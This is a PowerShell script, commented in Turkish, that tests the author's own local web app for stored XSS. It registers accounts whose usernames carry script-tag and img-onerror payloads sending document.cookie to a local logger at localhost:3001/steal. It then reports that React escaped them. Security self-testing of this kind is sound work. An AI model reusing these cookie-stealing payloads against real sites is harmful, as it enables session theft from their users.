# XSS Test Script - Windows PowerShell
# Bu scripti çalıştırarak XSS testini yapabilirsiniz

Write-Host "🔴 XSS Test Başlatılıyor..." -ForegroundColor Red
Write-Host ""

# Test 1: Basit XSS Payload
Write-Host "📤 Test 1: Script tag ile XSS payload gönderiliyor..." -ForegroundColor Yellow

$body = @{
    username = "<script>fetch('http://localhost:3001/steal?c='+document.cookie)</script>"
    email = "xss_test_1@test.com"
    password = "Test1234!"
    full_name = "XSS Test User"
} | ConvertTo-Json

try {
    $response = Invoke-WebRequest -Uri "http://localhost:8000/api/auth/register" `
        -Method POST `
        -ContentType "application/json" `
        -Body $body

    Write-Host "✅ Response Status: $($response.StatusCode)" -ForegroundColor Green
    Write-Host "Response: $($response.Content)" -ForegroundColor Cyan
} catch {
    Write-Host "❌ Error: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host ""
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray
Write-Host ""

# Test 2: Image onerror XSS
Write-Host "📤 Test 2: Image onerror ile XSS payload gönderiliyor..." -ForegroundColor Yellow

$body2 = @{
    username = "<img src=x onerror=`"fetch('http://localhost:3001/steal?c='+document.cookie)`">"
    email = "xss_test_2@test.com"
    password = "Test1234!"
    full_name = "XSS Test 2"
} | ConvertTo-Json

try {
    $response2 = Invoke-WebRequest -Uri "http://localhost:8000/api/auth/register" `
        -Method POST `
        -ContentType "application/json" `
        -Body $body2

    Write-Host "✅ Response Status: $($response2.StatusCode)" -ForegroundColor Green
} catch {
    Write-Host "❌ Error: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host ""
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray
Write-Host ""

# Test 3: Logger Stats Kontrolü
Write-Host "📊 Logger istatistikleri kontrol ediliyor..." -ForegroundColor Yellow

try {
    $stats = Invoke-WebRequest -Uri "http://localhost:3001/stats" -Method GET
    Write-Host "✅ Logger Stats:" -ForegroundColor Green
    Write-Host $stats.Content -ForegroundColor Cyan
} catch {
    Write-Host "❌ Logger'a bağlanılamadı: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host ""
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray
Write-Host ""

# Sonuçlar
Write-Host "✅ Test Tamamlandı!" -ForegroundColor Green
Write-Host ""
Write-Host "📋 Ne Oldu?" -ForegroundColor Yellow
Write-Host "1. XSS payload'ları backend'e gönderildi" -ForegroundColor White
Write-Host "2. Backend payload'ları VERİTABANINA kaydetti (vulnerable!)" -ForegroundColor White
Write-Host "3. Ama frontend render ederken React ESCAPE etti" -ForegroundColor White
Write-Host "4. Sonuç: Cookie çalınmadı (şimdilik güvenli)" -ForegroundColor White
Write-Host ""
Write-Host "🔍 Şimdi Ne Yapmalısınız?" -ForegroundColor Yellow
Write-Host "1. http://localhost:3000 açın" -ForegroundColor White
Write-Host "2. Yeni oluşturulan hesapla login olun" -ForegroundColor White
Write-Host "3. Profil menüsünü açın (sağ üst)" -ForegroundColor White
Write-Host "4. Username'in text olarak göründüğünü görün" -ForegroundColor White
Write-Host ""
Write-Host "🌐 Logger Dashboard: http://localhost:3001" -ForegroundColor Cyan
Write-Host "📊 Logger Stats: http://localhost:3001/stats" -ForegroundColor Cyan
